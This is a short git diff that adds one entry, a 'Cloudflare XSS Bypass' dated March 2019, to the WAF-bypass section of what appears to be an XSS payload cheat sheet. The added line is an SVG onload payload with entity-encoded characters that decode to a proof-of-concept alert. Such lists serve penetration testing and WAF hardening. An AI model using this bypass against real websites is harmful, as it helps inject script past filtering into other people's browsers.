@@ -817,6 +817,12 @@ Works for CSP like `script-src self`
 
 ## Common WAF Bypass
 
+### Cloudflare XSS Bypass - 22nd march 2019 (by @RakeshMane10)
+
+```
+<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+```
+
 ### Cloudflare XSS Bypass - 27th february 2018
 
 ```html
